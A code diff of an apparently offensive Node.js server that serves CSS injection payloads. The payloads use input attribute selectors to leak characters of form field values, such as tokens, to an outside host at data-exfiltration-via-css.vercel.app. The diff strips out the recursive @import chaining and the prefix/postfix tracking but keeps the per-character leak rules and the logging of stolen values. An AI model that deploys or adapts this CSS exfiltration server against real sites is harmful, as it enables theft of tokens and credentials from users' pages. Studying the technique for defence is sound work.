@@ -3,20 +3,8 @@ const url = require('url')
 
 const HOSTNAME = `https://data-exfiltration-via-css.vercel.app`
 
-let prefix = ''
-let postfix = ''
-
-let pending = []
-let stop = false
-let ready = 0
-let n = 0
-
 const generateResponse = (response) => {
-  console.log('...pre-payoad: ' + prefix)
-  console.log('...post-payoad: ' + postfix)
-
   let css =
-    `@import url(${HOSTNAME}/next?${Math.random()});\n\n` +
     [
       0,
       1,
@@ -52,9 +40,9 @@ const generateResponse = (response) => {
       'y',
       'z',
     ]
-      .map((char) => `input[value$="${char + postfix}"] { --e${n}: url(${HOSTNAME}/leak?post=${char + postfix}) }\n`)
+      .map((char) => `input[value$="${char}"] { --e: url(${HOSTNAME}/leak?post=${char}) }\n`)
       .join('') +
-    `\ninput { background: var(--e${n}, none) }\n\n` +
+    `\ninput { background: var(--e, none) }\n\n` +
     [
       0,
       1,
@@ -90,16 +78,13 @@ const generateResponse = (response) => {
       'y',
       'z',
     ]
-      .map((char) => `input[value^="${prefix + char}"] { --s${n}: url(${HOSTNAME}/leak?pre=${prefix + char}) }\n`)
+      .map((char) => `input[value^="${char}"] { --s: url(${HOSTNAME}/leak?pre=${char}) }\n`)
       .join('') +
-    `\ninput { border-image: var(--s${n}, none) }\n` +
-    `\ninput[value='${prefix + postfix}] { list-style: url(${HOSTNAME}/end?token=${prefix + postfix}&); }`
+    `\ninput { border-image: var(--s, none) }`
 
   response.writeHead(200, { 'Content-Type': 'text/css' })
   response.write(css)
   response.end()
-
-  n++
 }
 
 const requestHandler = (request, response) => {
@@ -107,44 +92,14 @@ const requestHandler = (request, response) => {
 
   console.log('req: %s', request.url)
 
-  if (stop) return response.end()
-
   switch (req.pathname) {
     case '/start':
       generateResponse(response)
       break
     case '/leak':
+      console.log('leak: %s', req.query)
       response.end()
-
-      if (req.query.pre && prefix !== req.query.pre) {
-        prefix = req.query.pre
-      } else if (req.query.post && postfix !== req.query.post) {
-        postfix = req.query.post
-      } else {
-        break
-      }
-
-      if (ready == 2) {
-        generateResponse(pending.shift())
-        ready = 0
-      } else {
-        ready++
-        console.log('leak: waiting others...')
-      }
       break
-    case '/next':
-      if (ready == 2) {
-        generateResponse(respose)
-        ready = 0
-      } else {
-        pending.push(response)
-        ready++
-        console.log('query: waiting others...')
-      }
-      break
-    case '/end':
-      stop = true
-      console.log('[+] END: %s', req.query.token)
     default:
       response.end("You know I'm, I'm bad, you know it!!")
   }
@@ -156,5 +111,5 @@ server.listen(80, (err) => {
   if (err) {
     return console.log('[-] Error: something bad happened', err)
   }
-  console.log('[+] Server is listening on %d', PORT)
+  console.log('[+] Server is listening on %d', 80)
 })
